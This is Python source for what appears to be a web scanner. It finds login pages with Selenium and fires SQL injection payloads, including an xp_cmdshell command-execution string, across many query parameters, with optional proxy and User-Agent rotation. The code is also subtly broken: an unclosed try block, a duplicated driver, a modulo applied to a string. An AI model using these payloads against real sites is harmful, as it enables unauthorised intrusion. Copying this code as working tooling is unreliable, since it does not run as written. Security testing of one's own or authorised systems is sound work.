from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from time import sleep
from colorama import Fore, Style
from urllib.parse import urljoin
import logging
import platform
import requests
import os

fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL


def check_session_management(domain):
    os_type = platform.system()
    if os_type == "Windows":
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
    elif os_type == "Linux" or os_type == "Darwin":  
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
    else:
        raise Exception(f"Unsupported OS: {os_type}")

    service = FirefoxService(executable_path=geckodriver_path)
    options = Options()
    options.headless = True

    driver = webdriver.Firefox(service=service, options=options)
    try:
        driver.get(domain)
        wait = WebDriverWait(driver, 10)

    login_paths = [
        "login",
        "wp-login.php",
        "admin",
        "user/login",
        "signin"
    ]

    try:
        driver = webdriver.Firefox(service=service, options=options)
        wait = WebDriverWait(driver, 10)

        login_pages = []
        for path in login_paths:
            full_url = f"{domain}/{path}"
            response = requests.get(full_url, verify=False)
            if response.status_code == 200:
                driver.get(full_url)
                if "login" in driver.title.lower() or "sign in" in driver.title.lower() or "anmelden" in driver.title.lower() or "einloggen" in driver.title.lower():
                    login_pages.append(full_url)
                    print(f"{fg}[+] Login page found at: {full_url}{fw}")

        if not login_pages:
            print(f"{fy}[-] No login pages found.{fw}")
    except Exception as e:
        print(f"{fr}[-] Error checking session management: {e}{fw}")
    finally:
        driver.quit()



# Set up logging
logging.basicConfig(filename='sql_injection_scan.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# List of SQL injection payloads
injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
    "admin'--",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "admin' or '1'='1"
]

# List of common query parameters
query_params = [
    "id", "name", "search", "q", "query", "item", "category", "product",
    "page", "user", "username", "email", "login", "pass", "password",
    "type", "sort", "order", "filter", "view", "action", "cmd", "command",
    "module", "path", "file", "filename", "dir", "directory", "folder",
    "content", "data", "date", "time", "year", "month", "day", "event",
    "title", "description", "comment", "message", "post", "article",
    "news", "blog", "forum", "thread", "topic", "board", "section",
    "chapter", "pageid", "postid", "threadid", "articleid", "newsid",
    "blogid", "forumid", "topicid", "boardid", "sectionid", "chapterid"
]

# List of common SQL error indicators
sql_error_indicators = [
    "sql syntax", "mysql", "syntax error", "sql error", "database error", 
    "invalid query", "unclosed quotation mark", "quoted string not properly terminated",
    "warning: pg_query", "unterminated quoted string", "error executing query",
    "you have an error in your sql syntax", "unexpected token", "missing right parenthesis"
]

def check_sql_injection(domain, delay=1, proxy=None, user_agents=None):
    vulnerable = False
    headers = {'User-Agent': 'Mozilla/5.0'}  # Default User-Agent

    for payload in injection_payloads:
        for param in query_params:
            try:
                # Construct the URL with query parameters
                test_url = urljoin(domain, f"/?{param}={payload}")
                
                # Optionally use proxy
                proxies = {"http": proxy, "https": proxy} if proxy else None
                
                # Rotate User-Agent if provided
                if user_agents:
                    headers['User-Agent'] = user_agents[param % len(user_agents)]
                
                response = requests.get(test_url, timeout=10, headers=headers, proxies=proxies)
                
                # Check for common SQL error indicators
                if any(error in response.text.lower() for error in sql_error_indicators):
                    logging.info(f"Possible SQL injection vulnerability detected with payload: {payload} on parameter: {param}")
                    print(f"{fr}{bd}[-] Possible SQL injection vulnerability detected with payload: {payload} on parameter: {param}{res}")
                    vulnerable = True
                
                sleep(delay)  # Throttle requests

            except requests.RequestException as e:
                logging.error(f"Error testing payload {payload} on parameter {param}: {e}")
                print(f"{fr}{bd}[-] Error testing payload {payload} on parameter {param}: {e}{res}")

    if not vulnerable:
        print(f"{fg}{bd}[+] No SQL injection vulnerabilities detected.{res}")
    else:
        logging.info("SQL injection scan completed with vulnerabilities detected.")
        print(f"{fr}{bd}[-] SQL injection scan completed with vulnerabilities detected.{res}")
